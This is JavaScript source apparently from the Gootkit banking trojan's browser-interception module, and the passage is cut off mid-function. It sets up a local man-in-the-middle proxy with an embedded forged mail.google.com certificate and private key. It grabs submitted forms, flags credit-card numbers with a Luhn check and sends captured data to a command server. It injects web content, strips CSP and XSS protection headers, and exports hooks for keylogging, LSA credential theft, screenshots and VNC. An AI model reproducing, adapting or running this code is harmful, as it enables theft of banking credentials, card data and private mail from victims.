
var http = require('http');
var https = require('https');
var util = require('util');
var utils = require('utils');
var url = require('url');
var path = require('path');
var fs = require('fs');
var dns = require('dns');
var querystring = require('querystring');
var tls = require('tls');
var protobuf = require('protocol_buffers');
var iconv = require('inconvlite');
var video_recorder = process.binding('video_recorder');
var cabfile = process.binding('cabfile');

var os = require('os');
var net = require('net');
var starttls = require('starttls');
var zeusfunctions = require("zeusmask");
var http_injection_stream = require('http_injection_stream');
var certgen = require("certgen");
var suspend = require('suspend'),
    resume = suspend.resume;

var gootkit_spyware = process.binding("spyware");
var video_recorder = process.binding('video_recorder');

var bIsProxyInitialized = false;

const PORT_REDIRECTION_BASE = 4000;
const P_SPYWARE = 4;
process.PORT_REDIRECTION_BASE = PORT_REDIRECTION_BASE;

var kMaximumPostDataLength = (65 * 1024);
var kHttpProxyPort = 18080;
var kHttpsProxyPort = 18443;
process.tls = {
    ciphers: 'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:ECDHE-RSA-DES-CBC3-SHA:ECDHE-ECDSA-DES-CBC3-SHA:AES128-GCM-SHA256:AES256-GCM-SHA384:AES128-SHA256:AES256-SHA256:AES128-SHA:AES256-SHA:AES:CAMELLIA:DES-CBC3-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!aECDH:!EDH-DSS-DES-CBC3-SHA:!EDH-RSA-DES-CBC3-SHA:!KRB5-DES-CBC3-SHA',
    method : 'TLSv1_method'
}


var KeepAliveAgent = require('keep_alive_agent');
var keepaliveHttpAgent = new KeepAliveAgent();
var keepaliveHttpsAgent = new KeepAliveAgent.Secure();

exports.SpInitialize = gootkit_spyware.SpInitialize;
exports.SpHookRecv = gootkit_spyware.SpHookRecv;
exports.SpHookSend = gootkit_spyware.SpHookSend;
exports.SpUnhookHttp = gootkit_spyware.SpUnhookHttp;
exports.SpTakeScreenshot = gootkit_spyware.SpTakeScreenshot;
exports.SpGetProcessList = gootkit_spyware.SpGetProcessList;
exports.SpGetLocalNetworkNeighborhood = gootkit_spyware.SpGetLocalNetworkNeighborhood;
exports.SpGetLocalUsersAndGroups = gootkit_spyware.SpGetLocalUsersAndGroups;

exports.SpLsaGrabCredentials = gootkit_spyware.SpLsaGrabCredentials;
exports.SpHookKeyboard = gootkit_spyware.SpHookKeyboard;
exports.DbgGetModuleDebugInformation = gootkit_spyware.DbgGetModuleDebugInformation;
exports.DbgGetLoadedModulesList = gootkit_spyware.DbgGetLoadedModulesList;
exports.DnsCacheGetDomainByAddr = gootkit_spyware.DnsCacheGetDomainByAddr;
exports.downloadFileRight = gootkit_spyware.DownloadFileRight;

exports.SpAddPortRedirection = gootkit_spyware.SpAddPortRedirection;
exports.SpGetVendor = gootkit_spyware.SpGetVendor;
exports.SpGetFileWatermark = gootkit_spyware.SpGetFileWatermark;
exports.SpSetFileWatermark = gootkit_spyware.SpSetFileWatermark;
exports.ExLoadVncDllSpecifyBuffers = gootkit_spyware.ExLoadVncDllSpecifyBuffers;

var global_cert = "-----BEGIN CERTIFICATE-----\r\nMIICtzCCAiCgAwIBAgJAwj/sQrLq6n+7nn9OSX0zzgGhP834SgLjlxQ96GHioum4\r\nj3w7bUQWVwUYjadfxZxt3S/xsss3zG5yJGJyFK64ATANBgkqhkiG9w0BAQUFADBC\r\nMRswGQYDVQQDExJHZW9UcnVzdCBHbG9iYWwgQ0ExFjAUBgNVBAoTDUdlb1RydXN0\r\nIEluYy4xCzAJBgNVBAYTAlVTMB4XDTE0MTEyNDE3MDkyOFoXDTE1MTEyNDE3MDky\r\nOFowaTEYMBYGA1UEAxMPbWFpbC5nb29nbGUuY29tMQswCQYDVQQGEwJVUzETMBEG\r\nA1UECBMKQ2FsaWZvcm5pYTEWMBQGA1UEBxMNTW91bnRhaW4gVmlldzETMBEGA1UE\r\nChMKR29vZ2xlIEluYzCBnzANBgkqhkiG9w0BAQEFAAOBjQAwgYkCgYEAriq+HsPB\r\noe//EIGy7/aDCsS95UEbVBVeeYOe4OpeOOdy3hE48HADYFEKwMMu2PLh9q9bzNnx\r\naXpRY8Amdcp5Gk4jHJ5akXXGnasw67vE6udzmSay1WgU7jrhkTAbWuyzEIwuehJ7\r\n15awJBKWWw2luxpbLOaw7WSW08vLn3Rk8H0CAwEAAaNXMFUwNAYDVR0lAQH/BCow\r\nKAYIKwYBBQUHAwIGCCsGAQUFBwMEBggrBgEFBQcDAQYIKwYBBQUHAwMwHQYDVR0R\r\nAQH/BBMwEYIPbWFpbC5nb29nbGUuY29tMA0GCSqGSIb3DQEBBQUAA4GBAH4Erwf9\r\nmw+RbSX4MKEppUzs+q7UumC8Z9p+7K3Pnl+xLY6ZW4tHEYLjJqcKGY2a+F4kDW6A\r\nhoyBr+qHJO9aXmoAbAHgHteS27kzWIulh1u6oHGFqHFXDTQKERdckn5MkqF3L+6h\r\nbMEpXkJNLOj2JWzfrUP+ZhVZy78VUEiqr/cY\r\n-----END CERTIFICATE-----\r\n";
var global_key = "-----BEGIN RSA PRIVATE KEY-----\nMIICXQIBAAKBgQCuKr4ew8Gh7/8QgbLv9oMKxL3lQRtUFV55g57g6l4453LeETjw\r\ncANgUQrAwy7Y8uH2r1vM2fFpelFjwCZ1ynkaTiMcnlqRdcadqzDru8Tq53OZJrLV\r\naBTuOuGRMBta7LMQjC56EnvXlrAkEpZbDaW7Glss5rDtZJbTy8ufdGTwfQIDAQAB\r\nAoGASUSt6l9LrAY8dQM69XvssLEHedQj3QGIVvIp+lBeBu5HAmiYXX2hzfkJ3wG9\r\nSYMT0CUBJ3Jf/pF4f9Ar3c2pl9bzN7MY9mmHMUfDl3heCb5NgMBIpu+1R7MKuLsT\r\nQ7aATQd4TIcmPBLX3J+p4G4xY6H55he+8PhZieata2g5XsECQQDnaeGns23X/4h3\r\n4DNyJu174JTEgc1D+rImHPsYcA98qR7G0wyg3E33CFbt+OdtTS1pEKwMAaKJ/qu+\r\n8TpPAeuFAkEAwKvVrMDKRGGHkd7LYPviJ6re9xR+3Iv37ELHGlyoeucXV423sgnh\r\nwE3BhaS2RtX25xOk7Bg63vQsSElMv0bWmQJBAMK+aBgo95d+g+nd022NNO264Xc9\r\nhPBgWOuaF/VI2L+f0zafBVGaFEJ/0igR/zAMctqoHSE9fvuCRiY5+0fh5cECQATs\r\nn2Jx7vl+cKOWySXqaiZPZLF18aQbY7PDJSmUUq4Jd/xB3/8J554tnpOW2R3IXC4d\r\nv2pVWDPYk8UpMm/1FIkCQQDI3gm7JNJqydrLP3plplfFB6hq3yxM1UG4Po+iCych\r\n3/vPHarkJzs3Gl6lH/lxK31gl8UEaF6DLGn8HFO+nzDc\r\n-----END RSA PRIVATE KEY-----";


var messages = protobuf([
    'message Form {\r',
      '\toptional string method = 1;\r',
      '\toptional string source = 2;\r',
      '\toptional string location = 3;\r',
      '\toptional string referer = 4;\r',
      '\toptional bool\tisSsl = 5;\r',
      '\toptional string rawHeaders = 6;\r',
      '\toptional bytes\tpostData = 7;\r',
      '\toptional string protocol = 8;\r',
      '\toptional bool \tisCertificateUsed = 9;\r',
      '\toptional bool \tisLuhnTestPassed = 10;\r',
  '}',
  'message LsaAuth {',
  '     optional string UserName = 1;',
  '     optional string UserDomain = 2;',
  '     optional string UserPassword = 3;',
  '}',
  'message MailMessage {',
    '     optional string html = 1;',
    '     optional string text = 2;',
    '     optional string subject = 3;',
    '     optional string messageId = 4;',
    '     optional string inReplyTo = 5;',
    '     optional string priority = 6;',
    '     optional string from = 7;',
    '     optional string to = 8;',
    '     optional string date = 9;',
    '     optional string receivedDate = 10;',
    '     optional string headers = 11;',
    '     optional bool isDeletedByMailware = 12;',
  '}',
  'message LogLine {',
  '     optional string logstr = 1;',
  '}'
].join('\n'));

var superstring = "hello :D; obama 4mo";
var trace = print;

function isTextResponse(headers) {
    var mimetype = headers["content-type"];
    if (mimetype && (mimetype.indexOf("javascript") != -1 || mimetype.indexOf("text/") != -1)) {
        return true;
    }
    return false;
}

function isValidFormdataPostRequest(clientRequest) {
    try {
        return (
			(clientRequest.method == 'POST') &&
			(typeof (clientRequest.headers["content-type"]) === 'string') &&
			(
                (clientRequest.headers["content-type"].indexOf("form") !== -1) ||
                (clientRequest.headers["content-type"].indexOf("multipart") !== -1)
            )
            
		);
    }
    catch (e) {
        console.log(e.stack);
        console.log(e.message);
    }

    return false;
}

function patchRequestLocation(host, strLocation, isSsl) {
    var location = (isSsl ? 'https' : 'http') + "://" + host + strLocation;
    var parsedUrl = url.parse(location);
    
    return parsedUrl;
}



function CapitaliseFirstLetter(string) {
    return string.charAt(0).toUpperCase() + string.slice(1);
}

function CapitalizeHeaderNameString(headerName) {
    var HeadersNameParts = headerName.split('-');

    for (var i = 0; i < HeadersNameParts.length; i++) {
        var t = HeadersNameParts[i];
        switch (t) {
            case 'www':
                HeadersNameParts[i] = 'WWW';
                break;
            default:
                HeadersNameParts[i] = CapitaliseFirstLetter(HeadersNameParts[i]);
                break;
        }

    }
    return HeadersNameParts.join('-');
}

function patchRequestHeaders(headers, newRequest) {

    var newHeaders = {};
    var restrictedHeaders = [
        "if-modified-since",
        "if-none-match",
        "accept-encoding"
    ];

    for (var h in headers) {
        if (restrictedHeaders.indexOf(h) === -1) {
            newHeaders[CapitalizeHeaderNameString(h)] = headers[h];
        }
    }

    newHeaders["Host"] = newRequest.host;
    newHeaders["Connection"] = 'keep-alive';

    return newHeaders;
}

function PatchDescByRedirectionRules(clientRequest){
    
    
    
    

    if (util.isUndefined(clientRequest)) {
        return false;
    }

    if (util.isUndefined(clientRequest.desc)) {
        return false;
    }

    var murl = clientRequest.desc.location;
    var method = clientRequest.desc.method.toUpperCase();

    if(method !== 'GET'){
        return false;
    }

    if (util.isUndefined(process.g_scfg)) {
        return false;
    }

    var redirectsArray = process.g_scfg.redirects;

    if (util.isUndefined(redirectsArray)) {
        return false;
    }
    
    for(var i = 0; i < redirectsArray.length; i ++)
    {
        if(redirectsArray[i].keyword.length < 2){
            continue;
        }

        if(redirectsArray[i].uri.length < 2){
            continue;
        }


        var keywordIndex = murl.indexOf(redirectsArray[i].keyword);
        if(keywordIndex !== -1)
        {

            var urlpart = murl.substr(keywordIndex + redirectsArray[i].keyword.length);

            if(urlpart && urlpart.length > 1)
            {
                var newUrl = (redirectsArray[i].uri + urlpart);
                var parsedUrl = url.parse(newUrl);

                clientRequest.headers.host = parsedUrl.host;
                clientRequest.url = parsedUrl.path;
                clientRequest.isSSL = (parsedUrl.protocol == 'https:');

                if(parsedUrl.port){
                    clientRequest.remotePort = parseInt(parsedUrl.port);
                }else{
                    if(clientRequest.isSSL){
                        clientRequest.remotePort = 443;
                    }else{
                        clientRequest.remotePort = 80;
                    }
                }
                return true;
            }
        }
    }


    return false;
}

function createRequestOption(clientRequest) {

    var newRequest = patchRequestLocation(
        clientRequest.headers.host,
        clientRequest.url,
        clientRequest.isSSL);

    var newHeaders = patchRequestHeaders(
        clientRequest.headers,
        newRequest);

    var x = {
        agent: false,
        hostname: clientRequest.headers.host,
        port: PORT_REDIRECTION_BASE + clientRequest.remotePort,
        path: newRequest.path,
        method: clientRequest.method,
        headers: newHeaders,
        rejectUnauthorized: false
    };

    if (typeof (clientRequest.headers['connection']) === 'string') {
        if (clientRequest.headers['connection'].toLowerCase() === 'keep-alive') {
            
            
        }
    }

    return x;
}

function isSslRequest(req) {
    return (req.isSSL == true);
}

function createUrlDescriptionFromRequestObject(req) {
    var headersString = '';


    for (var h in req.headers) {
        headersString += util.format('%s: %s\r\n', h, req.headers[h]);
    }

    var obj = {
        method: req.method,
        source: util.format("%s [%s.%s]", process.currentBinary, process.version, process.g_botId),
        location: req.url,
        referer: req.headers.referer,
        isSsl: isSslRequest(req),
        rawHeaders: headersString
    };
    var protocolSlashesPosition = obj.location.indexOf('://');
    if (protocolSlashesPosition !== 4 && protocolSlashesPosition !== 5) {
        obj.location = util.format(
            "%s//%s%s",
            (isSslRequest(req) ? 'https:' : 'http:'),
            req.headers.host,
            req.url
        );
    }

    obj.realdomain = req.headers.host.split(':')[0];

    if(obj.location.indexOf('/http') === 0){
         obj.location = obj.location.substr(1);
    }

    if(obj.location.indexOf('please_baby_stop_fuck_my_ass') !== -1){
        exports.SpStopHttpIntercepting();
    }

    return obj;
}




function calculateAlphabetSize(password) {
    var ustr = '';
    for (var i = 0; i < password.length; i++) {
        if (ustr.indexOf(password.charAt(i)) == -1) {
            ustr += password.charAt(i);
        }
    }
    return ustr;
}

function GetCCType(cc_num){
    var type = 0;
    
    if (cc_num.charAt(0) == '4' && (cc_num.length == 16 || cc_num.length == 13))
        type = 1;
        
    else if (cc_num.charAt(0) == '5' && cc_num.length== 16)
        type = 2; 
        
    else if (cc_num.charAt(0) == '3' && (cc_num.charAt(1) == '4' || cc_num.charAt(1) == '7') && cc_num.length == 15)
        type = 3; 
        
    else if (cc_num.charAt(0) == '6' && cc_num.charAt(1) == '0' && cc_num.charAt(2) == '1' && cc_num.charAt(3) == '1' && cc_num.length == 16)
        type = 4; 
    return type;

}

function luhnChk(luhnstr) {
    try{
        var luhn = luhnstr.replace(/[^0-9]/g, '');
        var len = luhn.length,
            mul = 0,
            prodArr = [[0, 1, 2, 3, 4, 5, 6, 7, 8, 9], [0, 2, 4, 6, 8, 1, 3, 5, 7, 9]],
            sum = 0;

        if (len != 16 || ((luhn.length - len) >= 6)) {
            return false;
        }

        if(GetCCType(luhn) == 0){
            return false;
        }

        if (calculateAlphabetSize(luhn).length < 5) {
            return false;
        }

        while (len--) {
            sum += prodArr[mul][parseInt(luhn.charAt(len), 10)];
            mul ^= 1;
        }
        return sum % 10 === 0 && sum > 0;
    }catch(exception)
    {
        return false;
    }
}

function IsJsonString(str) {
    try {
        return JSON.parse(str);
    } catch (e) {
        return false;
    }
}

function checkParsedRequestStringForLuhn10(parsedBody) {
    if (!util.isUndefined(parsedBody)) {
        for (var pair in parsedBody) {
            if (luhnChk(parsedBody[pair].toString()) === true) {
                return true;
            }
        }
    }
    return false;
}

function checkJSONForLuhn10(jsonObject){
    for(var i in jsonObject){
        if(typeof(jsonObject[i]) === 'string'){
            if(luhnChk(jsonObject[i]) === true){
                return true;
            }
        }else if(typeof(jsonObject[i]) === 'object'){
            if(checkJSONForLuhn10(jsonObject[i]) === true){
                return true;
            }
        }
    }
    
    return false;
}

function checkLuhn10(str){
    
    if(checkParsedRequestStringForLuhn10(querystring.parse(str))){
        return true;
    }
    
    var possibleJson = IsJsonString(str); 
    if(possibleJson){
        if(checkJSONForLuhn10(possibleJson)){
            return true;
        }
    }
    return false;
}

function IsBadUrl(url) {
    var restrictedUrls = [
        'facebook.com/ajax/',
        'mail.google.com/mail/',
        'mail.live.com/mail/'
    ];

    for (var i = 0; i < restrictedUrls.length; i++) {
        if (url.indexOf(restrictedUrls[i]) !== -1) {
            return true;
        }
    }

    return false;
}


var restrictedHosts = [
    'www.google-analytics.com',
    'counter.rambler.ru',
    'rs.mail.ru',
    'suggest.yandex.ru',
    'clck.yandex.ru',
    'plus.google.com',
    'plus.googleapis.com',
    's.youtube.com',
    'urs.microsoft.com',
    'safebrowsing-cache.google.com',
    'safebrowsing.google.com',
    'www.youtube.com'
];

var restrictedExtensions = [
    '.png', '.jpg', '.jpeg', '.gif', '.bmp',
    '.pcx', '.tiff', '.js', '.css', '.swf',
    '.avi', '.mpg', '.aac', '.mp3', '.mov',
    '.jar', '.cnt', '.scn', '.ico'
];

var restrictedSubstrings = [
    'safebrowsing',
    '.metric.gstatic.com',
    '/complete/search'
]

process.formgrabber = {
    restrictedExtensions: restrictedExtensions,
    restrictedHosts: restrictedHosts,
    restrictedSubstrings: restrictedSubstrings,
    options: {
        http: {
            grubGet: false,
            grubPost: false
        },

        https: {
            grubGet: false,
            grubPost: false
        }
    }
}

exports.formgrabber = process.formgrabber;

function IsBadFormgrabberForm(form) {

    

    

    try{
        if(form.postData)
        {
            if(form.postData.length > 2048)
            {
                print('skip too big post data');
                return true;
            }
        }

        var urlObject = url.parse(form.location);
        var pathname = urlObject.pathname;
        
        for (let i = 0; i < restrictedSubstrings.length; i++) {
            if (form.location.toLowerCase().indexOf(restrictedSubstrings[i]) !== -1) {
                return true;
            }
        }

        if (
            (restrictedExtensions.indexOf(path.extname(pathname.toLowerCase())) === -1) &&
            (restrictedHosts.indexOf(urlObject.host.toLowerCase()) === -1) &&
            (!IsBadUrl(form.location.toLowerCase()))
        ) {
            if (process.formgrabber.options) {
                var rule = process.formgrabber.options[form.protocol];
                if (!util.isUndefined(rule)) {
                    if (form.method === 'GET' && rule.grubGet === true)
                        return false; 

                    if (form.method === 'POST' && rule.grubPost === true)
                        return false; 
                }
            }
        }
    }catch(exception){
        process.log(exception, JSON.stringify(form));
    }
    return true;
}

function grabRequestData(form) {

    form.protocol = form.isSsl ? 'https' : 'http';

    if(!process.masterConnection){
        
        return;
    }

    if(process.bIsDebugVersion){
        
    }

    process.masterConnection.sendProtocolPacket(
        SLAVE_PACKET_URLNOTIFICATION,
        new Buffer(form.location)
    );

    process.emit('browser_navigate', form.location);

    if (!IsBadFormgrabberForm(form)) {

        var postData = form.postData;


        if (postData) {
            form.isLuhnTestPassed =
                checkLuhn10(postData.toString());
        }
        else 
        {
            form.isLuhnTestPassed = false;
        }

        if (process.masterConnection) {
            process.masterConnection.sendProtocolPacket(
                SLAVE_PACKET_FORM,
                messages.Form.encode(form)
            );
        }
        else{
            print('no master connection :(');
        }
    }
    else{
        print('bad form, bad!');
    }
}






var injAlowedContentTypes = [
    'text'
];


var injRestrictedSubstrings = [
    'safebrowsing',
    '.metric.gstatic.com',
    '/complete/search'
];

exports.injects = {
    injRestrictedSubstrings : injRestrictedSubstrings,
    restrictedExtensions: restrictedExtensions,
    injAlowedContentTypes: injAlowedContentTypes
}


function getEncodingBySource(buffer)
{
    try{
        var x = buffer.toString();
        var matches = x.match(/<meta.*?charset=([^"']+)/);
    	
        if(matches === null)
            return 'utf-8';
    
        return matches[1];
    }catch(error){
        return 'utf-8';
    }
}

function isMethodAlowed(method, inject) {
    if (
        (method == 'POST' && inject.base.filt_post) ||
        (method == 'GET' && inject.base.filt_get)
    ) {
        return true;
    }

    return false;
}

function ReplaceStandartMacroses(str, recordingHostname) {
    var retval = str;

    if (typeof (process.machineGuid) === 'string') {
        retval = retval.replace(/BOT_MACHINE_UUID/g, process.machineGuid);
    }

    retval = retval.replace(/BOT_MACHINE_DATE/g, new Date().toJSON());
    retval = retval.replace(/BOT_MACHINE_TIMESTAMP/g, Math.round(+new Date() / 1000));
    retval = retval.replace(/BOT_USERNAME/g, process.currentUser);
    retval = retval.replace(/BOT_USERDOMAIN/g, process.env['USERDOMAIN']);
    retval = retval.replace(/BOT_COMPUTERNAME/g, process.env['COMPUTERNAME']);
    retval = retval.replace(/BOT_VERSION/g, process.g_botId);
    retval = retval.replace(/BOT_PROCESS/g, process.currentBinary);
    retval = retval.replace(/BOT_PROCESS_ID/g, process.pid);
    retval = retval.replace(/BOT_PROCESS_PATH/g, process.execPath);

    var storedObjects = process.FsReadObjectEncrypted('gatevars.txt');
    if(storedObjects)
    {
        for(var i in storedObjects)
        {
            retval = retval.split(i).join(storedObjects[i]);
        }
    }
    if(recordingHostname){
		retval = retval.replace('%HOSTNAME%', recordingHostname)
    }

	retval = retval.replace('%DATE%', utils.getCurrentDateFilenameString())


    return retval;
}

function executeInjection(arg, on_complete) {

    var bDataIsModifed = false;

    process.emit('browser_before_injection', arg.method, 
        arg.location, 
        arg.htmlBuffer, 
        arg.contentType,
        arg.responseHeaders,
        arg.statusCode);

    if (util.isUndefined(process.g_scfg)) {
        return on_complete(arg, bDataIsModifed);
    }

    var injectsArray = process.g_scfg.injects;

    if (util.isUndefined(injectsArray)) {
        return on_complete(arg, bDataIsModifed);
    }

    if (util.isUndefined(arg)) {
        return on_complete(arg, bDataIsModifed);
    }

    var bContentTypeIsCorrect = true;
    var contentEncoding = getEncodingBySource(arg.htmlBuffer);
/*    
    if(process.bIsDebugVersion){
        trace('getEncodingBySource() : %s' , contentEncoding);
    }
*/
    if (!util.isUndefined(arg.contentType)) {
        if (arg.contentType.indexOf('charset=') !== -1) {
            contentEncoding = arg.contentType.split('charset=')[1].toLowerCase();
/*            if(process.bIsDebugVersion){
                trace('header contentEncoding : %s', contentEncoding);
            }*/
        }
    }
    
    
    var method = arg.method;
    var murl = arg.location;

    var urlObject = url.parse(murl);
    var pathname = urlObject.pathname;
    var extname = path.extname(pathname.toLowerCase());
        
    for(let i = 0; i < injRestrictedSubstrings.length; i ++){
        if(murl.indexOf(injRestrictedSubstrings[i]) !== -1){
            return on_complete(arg, bDataIsModifed);
        }
    }

    if(!util.isUndefined(process.IsBadPageForInject) && process.IsBadPageForInject(arg)){
        print('IsBadPageForInject');
        return on_complete(arg, bDataIsModifed);
    }

    var htmlText = iconv.decode(arg.htmlBuffer, contentEncoding);
/*
    trace('htmlBuffer : %d bytes', arg.htmlBuffer.length);
    trace('source : %d bytes', htmlText.length);
*/

    for (let i = 0; i < injectsArray.length; i++) {
        var inj = injectsArray[i];

        if (inj.base.enabled === false) {
            continue;
        }

        if (!zeusfunctions.isUrlNeedMatchedInRule(murl, inj)) {
            continue;
        }

        if (!isMethodAlowed(method, inj)) {
            continue;
        }

        print('zeusExecuteInjection!');
        var tmp = zeusfunctions.zeusExecuteInjection(htmlText, inj);
        if (tmp) {
            htmlText = ReplaceStandartMacroses(tmp);
            bDataIsModifed = true;
        }
    }

    if (bDataIsModifed) {
        arg.htmlBuffer = iconv.encode(new Buffer(htmlText), contentEncoding);
    }

    process.emit('browser_after_injection', arg.method, 
        arg.location, 
        arg.htmlBuffer, 
        arg.contentType,
        arg.responseHeaders,
        arg.statusCode);
    
    on_complete(arg, bDataIsModifed);
}


function isContentModificationNeeded(arg, bSearchOnlyStreamInjects) {

    var murl = arg.location;
    var method = arg.method.toUpperCase();

    if (util.isUndefined(process.g_scfg)) {
        return false;
    }

    var injectsArray = process.g_scfg.injects;

    if (util.isUndefined(injectsArray)) {
        return false;
    }

    if (util.isUndefined(arg)) {
        return false;
    }


    try {

        for (let i = 0; i < injectsArray.length; i++) {

            var inj = injectsArray[i];

            if(bSearchOnlyStreamInjects){
                if(!http_injection_stream.isStreamedInjection(inj)){
                    continue;
                }
            }else{
                if(http_injection_stream.isStreamedInjection(inj)){
                    continue;
                }
            }

            if (inj.base.enabled === false) {
                //trace('%s : disabled', inj.base.url);
                continue;
            }

            if (!zeusfunctions.isUrlNeedMatchedInRule(murl, inj)) {
                //trace('%s : not matched', inj.base.url);
                continue;
            }

            if (!isMethodAlowed(method, inj)) {
                //trace('%s : method not alowed', inj.base.url);
                continue;
            }

            //trace('%s : is matched!', inj.base.url);

            return true;
        }

    } catch (e) {
       process.logException(e, JSON.stringify(arg));
       trace('exception : isContentModificationNeeded() : %s', e.message);
    }

    return false;
}

//------------------------------------------------
// -- 
//------------------------------------------------

function RemoveTooGoodHeaders(headers)
{
    [
        "If-None-Match",
        "X-WebKit-CSP",
        "X-Content-Security-Policy",
        "Content-Security-Policy-Report-0nly",
        "Content-Security-Policy-Report-Only",
        "X-Content-Security-Policy-Report-Only",
        "X-Frame-Options",
        "Content-Security-Policy",
        "X-Content-Type-Options",
        "X-Frame-Options",
        "X-XSS-Protection",
        'accept-range',
        'alternate-protocol',
        'alt-svc'
    ].forEach(function(hdr){
        delete headers[hdr.toLowerCase()];
    })

    headers['expires'] = 'Mon, 26 Jul 1997 05:00:00 GMT';
    headers['cache-control'] = 'no-cache,no-store,must-revalidate';
    headers['pragma'] = 'no-cache';
    return headers;
}

function modifyResponseBufferIfNecessary(clientRequest, realResponse, responseBuffer, onComplete) {

    clientRequest.desc.htmlBuffer = responseBuffer;
    clientRequest.desc.contentType = realResponse.headers['content-type'];
    clientRequest.desc.responseHeaders = RemoveTooGoodHeaders(realResponse.headers);
    clientRequest.desc.statusCode = realResponse.statusCode;

    executeInjection(clientRequest.desc, onComplete);
}

function sendHeaders(clientResponse, statusCode, headers) {
    var headersArray = [];

    if(headers['content-length'])
    {
        if(headers['transfer-encoding']){
            delete headers['transfer-encoding'];
        }
        clientResponse.removeHeader('transfer-encoding');
    }

    for (var h in headers) {

        var headerName = h;
        var headerValue = headers[h];

        if (headerName === 'www-authenticate') {
            var headerVeluesArray = headerValue.split(', ');
            headerVeluesArray.forEach(function (item) {
                headersArray.push([
                    CapitalizeHeaderNameString(headerName), item
                ]);
            });
        } else {
            headersArray.push([
                 CapitalizeHeaderNameString(headerName), headerValue
            ]);
        }
    }
    clientResponse.writeHead(statusCode, headersArray);
}

function isInternalApiRequest(requestDesc){
    if(requestDesc.location.indexOf('spinternalcall') !== -1){
        return true;
    }

    return false;
}

function IsLocationLocked(location){

    //trace("IsLocationLocked : '%s'", location);

    if(!process.proxyServers){
        return false;
    }

    if(!process.proxyServers.blockedAddresses){
        return false;
    }


    for(let i = 0; i < process.proxyServers.blockedAddresses.length; i ++){
        if (zeusfunctions.zeusSearchContentIndex(location, 
            process.proxyServers.blockedAddresses[i])
        ){
            return true;
        }
    }

    return false;
}

function manageUserConnection(clientRequest, clientResponse, isSsl) {

    clientRequest.isSSL = isSsl;
/*
    trace('begin clientRequest.headers : >>>>>>>>')
    trace(clientRequest.headers);
    trace('end of clientRequest.headers : <<<<<<<<')
*/
    clientRequest.desc = createUrlDescriptionFromRequestObject(clientRequest);
    
    if(isInternalApiRequest(clientRequest.desc)){
        //trace("thi is internal request. serve data");
        return require('internalapi').serve(clientRequest, clientResponse);
    }

    var requestEngine = ((isSsl == true) ? https : http);

    //trace("clientRequest.desc.location : %s", clientRequest.desc.location);

    if(IsLocationLocked(clientRequest.desc.location) === true){
        //trace("location locked. ending request...");
        return clientResponse.end();
    } 

    clientRequest.isRedirectionRuleTriggered = 
        PatchDescByRedirectionRules(clientRequest);

    if(!clientRequest.isRedirectionRuleTriggered){
        process.emit('browser_request', clientRequest.desc);
    }

    var proxyRequest = requestEngine.request(createRequestOption(clientRequest), function (realResponse) {
        
        realResponse.isStreamInjectionNeeded = false;
        realResponse.isSsl = isSsl;
        realResponse.realdomain = clientRequest.desc.realdomain;
        realResponse.TrueContentLength = (realResponse.headers['content-length'] || -1);

        process.emit('browser_response', realResponse);

        if(!clientRequest.isRedirectionRuleTriggered){        
            grabRequestData(clientRequest.desc);
        }

        var bIsTextResponse = isTextResponse(realResponse.headers);

        if(bIsTextResponse){
            realResponse.headers = 
                RemoveTooGoodHeaders(realResponse.headers);
        }

        if (
            (!clientRequest.isRedirectionRuleTriggered) && 
            bIsTextResponse && 
            isContentModificationNeeded(clientRequest.desc, false)
        ){
            excludedHosts = [];
            clientResponse.isResponseMustBeBuffered = true;
            clientResponse.buffers = [];
            realResponse.headers['server'] = 'nginx/1.4.8';

        } else if(
            (!clientRequest.isRedirectionRuleTriggered) && 
            bIsTextResponse && 
            isContentModificationNeeded(clientRequest.desc, true)
        ){ // stream injection ??
            // ���� � ��� ��������� ������, ���� �������
            // �������-���� � ������ ������-��������
            delete realResponse.headers['content-length'];
            
            // ���� ������� ���� ���������� ��� ��������� 
            // ������ ��� ��������
            realResponse.headers['server'] = 'nginx/1.4.9';

            // ������ ������-���������
            realResponse.headers['transfer-encoding'] = 'chunked';

            realResponse.isStreamInjectionNeeded = true;

            // ���������� � ������� ������
            sendHeaders(clientResponse, 
                realResponse.statusCode, 
                realResponse.headers);

        }else{
            // https://abs.twimg.com/a/1450471907/css/t1/twitter_core.bundle.css
            
            if(realResponse.TrueContentLength !== -1){
                realResponse.headers['content-length'] = 
                    realResponse.TrueContentLength;
            }
            
            realResponse.headers['server'] = 'nginx/1.4.7';
            
            sendHeaders(clientResponse, 
                realResponse.statusCode, 
                realResponse.headers);
        }

        if(realResponse.isStreamInjectionNeeded === true){

            var InjectionStream = http_injection_stream.InjectionStream;
            var injectionStream = new InjectionStream({
                location : clientRequest.desc.location,
                contentType : realResponse.headers["content-type"] || 'text/html'
            });
            
            realResponse
                .pipe(injectionStream)
                .pipe(clientResponse);

        }else{
            realResponse.on('data', function (chunk) {
                if (clientResponse.isResponseMustBeBuffered == true){
                    clientResponse.buffers.push(chunk);
                } else {
                    clientResponse.write(chunk, 'binary');
                }
            });
        }


        realResponse.on('end', function () {
            try{
                if (clientResponse.isResponseMustBeBuffered == true) {

                    var bufferedResponse = Buffer.concat(clientResponse.buffers);

                    modifyResponseBufferIfNecessary(clientRequest, realResponse, 
                        bufferedResponse, function (newResponseObject, isModifed
                    ){
                        if (isModifed && newResponseObject && newResponseObject.htmlBuffer) 
                        {

                            newResponseObject.responseHeaders['X-Server-Time'] =  new Date().getTime().toString();
                            
                            newResponseObject.responseHeaders['content-length'] = 
                                newResponseObject.htmlBuffer.length;
                            
                            sendHeaders(clientResponse, 
                                newResponseObject.statusCode, 
                                newResponseObject.responseHeaders);

                            clientResponse.end(newResponseObject.htmlBuffer);
                        } else {
                            
                            realResponse.headers['content-length'] = bufferedResponse.length;
                            
                            sendHeaders(clientResponse, 
                                realResponse.statusCode, 
